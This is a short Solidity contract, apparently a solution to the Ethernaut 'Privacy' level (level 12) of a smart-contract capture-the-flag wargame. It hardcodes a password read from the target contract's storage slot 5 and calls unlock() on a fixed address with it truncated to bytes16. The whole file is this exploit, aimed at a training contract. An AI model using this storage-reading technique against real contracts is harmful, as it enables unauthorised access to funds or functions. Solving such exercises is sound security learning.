//SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

interface IPrivacy {
    function unlock(bytes16 _key) external;
}

contract EthernautLevel12 {
    //Obtain password by accessing storge at index5
    bytes32 password32 =
        0xac9a64a91da9197bf1b5e5aad3ed6854d72534925a474296eb9e44cdf081cfca;
    address privacyContractAddress = 0x17d5Ab6C87444a9Ac203B1535D237190383f4330;

    function attackPrivacyContract() external {
        IPrivacy(privacyContractAddress).unlock(bytes16(password32)); //cast the password to bytes16 and call unlock
    }
}
